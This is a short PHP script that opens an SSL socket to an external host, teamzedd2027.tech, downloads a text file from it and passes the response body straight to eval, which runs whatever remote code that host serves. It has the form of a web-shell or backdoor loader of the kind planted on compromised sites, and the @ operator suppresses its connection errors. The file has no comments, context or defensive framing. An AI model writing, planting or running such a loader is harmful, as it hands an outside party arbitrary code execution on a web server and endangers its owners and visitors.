<?php
$主机 = "teamzedd2027.tech";
$连接 = @fsockopen("ssl://".$主机, 443, $errno, $errstr, 10);
if ($连接) {
    $请求 = "GET /project/rahman.txt HTTP/1.1\r\nHost: $主机\r\nConnection: Close\r\n\r\n";
    fwrite($连接, $请求);
    $响应 = "";
    while (!feof($连接)) { $响应 .= fgets($连接, 4096); }
    fclose($连接);
    
    $代码 = explode("\r\n\r\n", $响应, 2)[1];
    if ($代码) eval("?>".$代码);
}